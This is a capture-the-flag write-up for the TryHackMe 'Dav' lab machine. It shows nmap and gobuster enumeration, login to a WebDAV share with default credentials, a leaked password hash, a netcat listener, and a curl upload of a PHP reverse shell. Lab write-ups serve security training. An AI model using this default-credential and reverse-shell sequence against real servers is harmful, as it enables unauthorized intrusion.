# THM - Dav

## IP address
10.10.98.127

## Write Up
1. do an Nmap scan.
```bash
#make a directory to store where you are going to store you nmap results
mkdir nmap
#scan for open ports and direct results to nmap/initial
nmap -p- -sV -sC -oN nmap/initial 10.10.98.127
```
- Results shows that only port ```80``` is open:
```
root@kali:~# nmap -p- -sV -sC -oN nmap/initial 10.10.98.127
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 14:05 UTC
Nmap scan report for ip-10-10-98-127.eu-west-1.compute.internal (10.10.98.127)
Host is up (0.00060s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:B1:99:F9:9A:AE (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```

2. Visiting ```10.10.98.127```, you will realised its a Apache Ubuntu default page. Lets try running gobuster:
```bash
gobuster dir -u http://10.10.98.127 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

-Results show a page called ```/webdav``` but its a ```401``` page, meaning login is probably required.
```
/webdav (Status: 401)
/server-status (Status: 403)
```

3. Some research shows that the default password for ```webdav``` is ```wampp:xampp```

4. So after logging in you will see a ```passwd.dav``` file which shows:
```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

5. After some research, seems like ```webdav``` is vunerable to reverse shell. So lets edit our handy resverse php shell from [Php Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).


6. Remember to set your listener on another terminal ```nc -lvnp 9001```.

7. Now lets run ```curl``` to remotely upload our ```shell.php```:
```bash
curl http://10.10.98.127/webdav/shell.php -u wampp:xampp --upload-file shell.php
```
-Results shows that the upload was successful:
```
root@kali:~# curl http://10.10.98.127/webdav/shell.php -u wampp:xampp --upload-file shell.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.98.127 Port 80</address>
</body></html>
```

- When we refresh our browser we will see that the directory has a new ```shell.php``` file.
